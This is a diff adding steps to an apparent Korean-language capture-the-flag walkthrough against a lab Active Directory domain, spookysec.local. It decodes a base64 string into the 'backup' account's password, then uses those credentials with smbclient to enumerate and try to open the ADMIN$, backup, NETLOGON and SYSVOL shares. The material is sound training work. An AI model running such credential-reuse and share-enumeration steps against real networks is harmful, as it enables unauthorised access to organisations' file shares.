@@ -480,3 +480,39 @@ YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
 ┌──(root㉿docker-desktop)-[/]
 └─# echo YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw | base64 -d
 backup@spookysec.local:backup2517860
+
+계정 : backup@spookysec.local
+비밀번호 : backup2517860
+
+# 얻은 정보로 다시 재접근 -> 로그인 시 도메인은 생략
+
+smbclient -L spookysec.local -U backup%backup2517860
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        backup          Disk
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        SYSVOL          Disk      Logon server share
+
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to spookysec.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+# 직접 공유 폴더로 접근 -> 접근 불가
+
+smbclient //spookysec.local/backup -U backup%backup2517860
+
+smb: \>ls
+NT_STATUS_ACCESS_DENIED listing \*
+smb: \>
+
+# NETLOGON 공유 폴더 접근 시도
+
+smbclient //spookysec.local/NETLOGON -U backup%backup2517860
+
+# SYSVOL 공유 폴더 접근 시도
+
+smbclient //spookysec.local/SYSVOL -U backup%backup2517860
